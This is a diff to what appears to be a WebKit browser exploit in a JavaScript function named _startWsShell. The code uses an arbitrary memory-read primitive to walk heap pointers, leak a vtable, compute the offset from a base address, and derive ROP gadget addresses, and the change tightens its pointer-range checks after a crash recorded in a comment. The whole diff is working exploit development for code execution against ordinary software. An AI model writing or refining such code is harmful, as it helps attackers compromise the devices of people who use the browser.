@@ -6228,32 +6228,44 @@ function _startWsShell(){
               var L2=S.absRead(MBUF+0x68n,8)[0];
               LB('b L1=0x'+L1.toString(16)+' L2=0x'+L2.toString(16));
               reply.L1='0x'+L1.toString(16);reply.L2='0x'+L2.toString(16);
-              /* the hash table at L1-0x10: 8 buckets - find the client (IM) */
+              /* the hash table at L1-0x10: 8 buckets - find the client
+               * WeakPtrImpl (a CAGE-band pointer, like L1 itself - the
+               * session-168 lesson: the first bucket held a WebKit TEXT
+               * pointer (0x806847ce0) and the loose range filter took
+               * it -> a text-band FO -> the VP read hit XO text = death.
+               * STRICT BANDS: IM = cage [0x1000000000,0x1010000000);
+               * FO (=[IM+8]) = cage; VP (=[FO]) = the 0x8-band; only
+               * then read the vtable (rodata, readable). ALL candidates
+               * tried; failures skipped, never dereferenced blind. */
               var IM=0n;
-              if(L1>0x100000000n&&L1<0x10000000000n){
+              if(L1>=0x1000000000n&&L1<0x1010000000n){
                 var ht=S.absRead(L1-0x10n,0x50);
-                for(var bi8=0;bi8<ht.length;bi8++){
+                var walkOK=false;
+                for(var bi8=0;bi8<ht.length&&!walkOK;bi8++){
                   var bv=ht[bi8];
-                  if(bv>0x100000000n&&bv<0x10000000000n&&(bv&0xFFn)!==0n){IM=bv;LB('c bucket IM=0x'+IM.toString(16));break;}
+                  if(bv<0x1000000000n||bv>=0x1010000000n)continue;
+                  try{
+                    var im8=S.absRead(bv,0x10);
+                    var FOc=im8[1];
+                    if(FOc<0x1000000000n||FOc>=0x1010000000n)continue;
+                    var VPc=S.absRead(FOc,8)[0];
+                    if(VPc<0x800000000n||VPc>=0x880000000n)continue;
+                    IM=bv;walkOK=true;
+                    LB('c IM=0x'+IM.toString(16)+' FO=0x'+FOc.toString(16)+' VP=0x'+VPc.toString(16));
+                    reply.IM='0x'+IM.toString(16);reply.FO='0x'+FOc.toString(16);
+                    var VP=VPc;
+                    reply.VP='0x'+VP.toString(16);
+                    LB('e VP delta-from-BASE=0x'+(VP-S.BASE).toString(16));
+                    var vt=S.absRead(VP,0x48);
+                    var slots=[];
+                    for(var sI8=0;sI8<9;sI8++)slots.push('0x'+vt[sI8].toString(16));
+                    reply.vtable=slots;
+                    var s0=vt[0];
+                    if(s0>0x800000000n){reply.gadgets={ret:'0x'+(s0-1n).toString(16),popRbp:'0x'+(s0-2n).toString(16),popRdiPopRbpRet:'0x'+(s0-4n).toString(16)};}
+                    LB('f slots '+slots.join(' '));
+                  }catch(eWb){LB('c cand 0x'+bv.toString(16)+' failed');}
                 }
-              }
-              if(IM){
-                var im8=S.absRead(IM,0x10);
-                var FO=im8[1];
-                LB('d FO=0x'+FO.toString(16));
-                reply.FO='0x'+FO.toString(16);
-                if(FO>0x100000000n&&FO<0x10000000000n){
-                  var VP=S.absRead(FO,8)[0];
-                  reply.VP='0x'+VP.toString(16);
-                  LB('e VP=0x'+VP.toString(16)+' delta-from-BASE=0x'+(VP-S.BASE).toString(16));
-                  var vt=S.absRead(VP,0x48);
-                  var slots=[];
-                  for(var sI8=0;sI8<9;sI8++)slots.push('0x'+vt[sI8].toString(16));
-                  reply.vtable=slots;
-                  var s0=vt[0];
-                  if(s0>0x800000000n){reply.gadgets={ret:'0x'+(s0-1n).toString(16),popRbp:'0x'+(s0-2n).toString(16),popRdiPopRbpRet:'0x'+(s0-4n).toString(16)};}
-                  LB('f slots '+slots.join(' '));
-                }
+                if(!walkOK)LB('c no valid walk chain in buckets');
               }
             }
           }catch(eW8){LB('a walk fault: '+String(eW8&&eW8.message?eW8.message:'?'));}
